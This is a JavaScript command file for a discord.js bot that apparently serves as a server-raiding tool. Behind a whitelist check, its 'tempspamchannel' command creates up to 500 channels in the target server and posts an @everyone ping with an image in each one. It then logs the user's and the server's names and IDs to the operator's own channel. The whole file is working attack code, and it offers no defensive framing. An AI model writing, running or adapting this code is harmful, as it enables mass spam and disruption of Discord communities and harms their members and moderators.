const Discord = require('discord.js');
const db = require('megadb')
const blacklist = new db.crearDB("blacklist")
const serverlist = new db.crearDB("serverlist")
const sexo = '0x410255'

let cooldown = new Set()

module.exports = {
  name: "tempspamchannel",
  alias: [],

execute (client, message, args){

  if(!blacklist.has(message.author.id)){
    const a = new Discord.MessageEmbed()
    .setDescription("You are not registered in the Whitelist.")
    .setColor(sexo)
     return message.reply({embeds: [a]})
  }

  if (serverlist.tiene(message.guild.id)){
    const serverInListEmbed = new Discord.MessageEmbed()
        .setDescription("<:Converter:995595217782718475> This command is not available in this server.")
        .setColor(sexo);
      return message.reply({ embeds: [serverInListEmbed] });
    }

  if(!message.guild.me.permissions.has("MANAGE_CHANNELS")){
    const wu = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> I don't have permissions. I need the `MANAGE_CHANNELS`.")
   .setColor(sexo)
   return message.reply({embeds: [wu]})
  }

  if(cooldown.has(message.author.id)){
    const l = new Discord.MessageEmbed()
    .setDescription(`<:Converter:995595217782718475> ${message.author}, you must wait 10 seconds to use the command.`)
    .setColor(sexo)
    return message.reply({embeds: [l]})
  }

  cooldown.add(message.author.id);

  setTimeout(() => {
    cooldown.delete(message.author.id);
  }, 10000);

  try {

let pendejo = args[0]
if(!pendejo){
  const qq = new Discord.MessageEmbed()
  .setDescription("<:Converter:995595217782718475> You must say an amount!\nMode of use: `.tempspamchannel [amount]`")
  .setColor(sexo)
  return message.reply({embeds: [qq]})
}

  if(isNaN(pendejo)){
    const q = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> You must say number.\nMode of use: `.tempspamchannel [amount]`")
    .setColor(sexo)
    return message.reply({embeds: [q]})
  }

  if(pendejo > 501){
    const qqq = new Discord.MessageEmbed()
    .setDescription("<:Converter:995595217782718475> You must say a number lees than 501.")
    .setColor(sexo)
    return message.reply({embeds: [qqq]})
  }

  for (let i = 0 ; i < pendejo; ++i){

    if(message.guild.channels.cache.size >= 500){
       break;
     }
    
    message.guild.channels.create(`${client.user.username} empire`, { type: "GUILD_TEXT" }).catch((err) => { console.log(("Error Found: " + err)) }).then((ch) => {
      ch.send("@everyone\nhttps://images-ext-1.discordapp.net/external/jZ-qJWN-V5InVg4l-7b-JLM7UUxeT-A0xcRfsCzoNTQ/%3Fsize%3D1024/https/cdn.discordapp.com/avatars/1156468991724883979/04f7ebac763a25ebb6bea64e99658f04.webp?width=497&height=497")
      
    })

  }

  const embok = new Discord.MessageEmbed()
  .setDescription("<:k_:995595248266915870> command ejecuted.")
  .setColor(sexo)
  message.author.send({embeds: [embok]}).catch(err => {
    console.log(err)
  })
  
  const e = new Discord.MessageEmbed()

   .setDescription(`<:k_:995595248266915870> tempspamchannel executed successfully!`)
     .addField("User", `**${message.author.tag}** | **${message.author.id}**`)
    .addField("Server Name", `**${message.guild.name}** | **${message.guild.id}**`)
   .setColor(sexo)
    .setThumbnail(message.author.displayAvatarURL({format: 'png', dynamic: true}))


   client.channels.cache.get("1186076417142816808").send({embeds: [e]})


} catch (error) {
  const laoo = new Discord.MessageEmbed()
  .setDescription("<:Converter:995595217782718475> Error found")
  .addField("> Command", "`tempspamchannel`", true)
  .addField("> Error", `\`${error}\``, true)
  .setColor("#410255")

  client.channels.cache.get('1210148130264322119').send({embeds: [laoo]})

  message.author.send("<:Converter:995595217782718475> Error found")
}


 }

}